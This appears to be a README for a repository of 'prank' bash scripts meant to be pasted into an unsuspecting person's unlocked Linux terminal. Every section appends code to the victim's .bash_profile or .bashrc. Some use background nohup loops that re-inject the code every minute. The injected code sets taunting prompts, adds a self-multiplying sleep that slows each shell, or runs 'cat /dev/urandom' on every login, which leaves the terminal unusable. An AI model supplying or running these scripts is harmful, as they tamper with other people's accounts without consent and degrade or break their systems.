# fun-prank-scripts

## Kill nohup commands
```
pkill -f "bash -c while true;"
```

## rainbow_script
Copy and paste the script into unsuspecting user's linux terminal, and on their next login, it will modify their bashrc file to make their ps1 very colorful!
This will continue to happen until they remove the added code from the .bash_profile file.
```
cat >> "$HOME/.bash_profile" << 'EOF'
BLOCK_START="# >>> LOCKED PROMPT PRANK START >>>"
BLOCK_END="# <<< LOCKED PROMPT PRANK END <<<"

TARGET="$HOME/.bashrc"

if ! grep -Fq "$BLOCK_START" "$TARGET"; then
  cat >> "$TARGET" << 'BLOCK'
# >>> LOCKED PROMPT PRANK START >>>
random_prompt() {
  local base_colors=(30 31 32 33 34 35 36 37)
  local prompt="hey there! you should have locked your computer! :$ "
  local colored_prompt=""
  local prompt_length=${#prompt}

  for ((i=0; i<prompt_length; i++)); do
    local char="${prompt:$i:1}"
    local color=${base_colors[$RANDOM % ${#base_colors[@]}]}
    colored_prompt+="\[\e[0;${color}m\]$char"
  done

  colored_prompt+="\[\e[0m\]"  # Reset color
  PS1="$colored_prompt"
}

PROMPT_COMMAND=random_prompt
# <<< LOCKED PROMPT PRANK END <<<
BLOCK
fi
EOF
```
or
```
nohup bash -c 'while true; do grep -q "# Ben Was here" ~/.bashrc || echo -e "# Ben Was here \nrandom_prompt() {
  local base_colors=(30 31 32 33 34 35 36 37)
  local prompt="hey there! you should have locked your computer! :$ "
  local colored_prompt=""
  local prompt_length=${#prompt}

  for ((i=0; i<prompt_length; i++)); do
    local char="${prompt:$i:1}"
    local color=${base_colors[$RANDOM % ${#base_colors[@]}]}
    colored_prompt+="\[\e[0;${color}m\]$char"
  done

  colored_prompt+="\[\e[0m\]"  # Reset color
  PS1="$colored_prompt"
}

PROMPT_COMMAND=random_prompt" >> ~/.bashrc; sleep 60; done' > /dev/null 2>&1 &
```

## sleeping
Copy and paste the script into unsuspecting user's linux terminal, and on their next login, it will modify their bashrc file to add sleep to their bashrc every time it's run!
This will continue to happen until they remove the added code from the .bash_profile file.

```
cat >> "$HOME/.bash_profile" << 'EOF'
cat >> "$HOME/.bashrc" << 'BLOCK'
echo sleep 0.$RANDOM >> $HOME/.bashrc
BLOCK
EOF
```
or
```
nohup bash -c 'while true; do grep -q "# Ben Was here" ~/.bashrc || echo -e "# Ben Was here \necho sleep 0.$RANDOM >> $HOME/.bashrc" >> ~/.bashrc; sleep 60; done' > /dev/null 2>&1 &
```

## cat_ps1
```
cat >> "$HOME/.bash_profile" << 'EOF'
cat >> "$HOME/.bashrc" << 'BLOCK'
export PS1='\n|\---/|\n| o_o |\n \_^_/\n\n\$ '
BLOCK
EOF
```
or
```
nohup bash -c 'while true; do grep -q "# Ben Was here" ~/.bashrc || echo -e "# Ben Was here \nexport PS1='\n|\---/|\n| o_o |\n \_^_/\n\n\$ '" >> ~/.bashrc; sleep 60; done' > /dev/null 2>&1 &
```

## random_chars
```
cat >> "$HOME/.bash_profile" << 'EOF'
cat >> "$HOME/.bashrc" << 'BLOCK'
cat /dev/urandom
BLOCK
EOF
```
or
```
nohup bash -c 'while true; do grep -q "# Ben Was here" ~/.bashrc || echo -e "# Ben Was here \ncat /dev/urandom" >> ~/.bashrc; sleep 60; done' > /dev/null 2>&1 &
```
